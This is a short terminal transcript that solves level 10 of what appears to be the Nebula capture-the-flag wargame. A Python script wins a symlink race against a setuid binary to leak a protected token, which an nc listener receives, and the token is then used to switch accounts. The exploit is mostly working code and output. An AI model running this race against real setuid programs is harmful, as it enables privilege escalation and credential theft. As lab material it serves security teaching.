```
level10@nebula:/home/flag10$ cat << EOF > /tmp/flag10.py
> #!/usr/bin/env python
> 
> import os
> import subprocess
> import time
> import sys
> 
> os.remove("/tmp/token")
> open("/tmp/token", "a").close()
> os.setuid(os.geteuid())
> os.setgid(os.getegid())
> subprocess.Popen(["/home/flag10/flag10", "/tmp/token", "127.0.0.1"])
> time.sleep(float(sys.argv[1]))
> os.remove("/tmp/token")
> os.symlink("/home/flag10/token", "/tmp/token")
> EOF

[ execute in another console ]
level10@nebula:/home/flag10$ nc -kl 18211

[ execute in original console ]
level10@nebula:/home/flag10$ /tmp/flag10.py 0.0005
Connecting to 127.0.0.1:18211 .. level10@nebula:/home/flag10$ Connected!
Sending file .. wrote file!

[ output in the other console ]
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27

level10@nebula:/home/flag10$ su flag10
Password:
sh-4.2$ getflag
You have successfully executed getflag on a target account

```
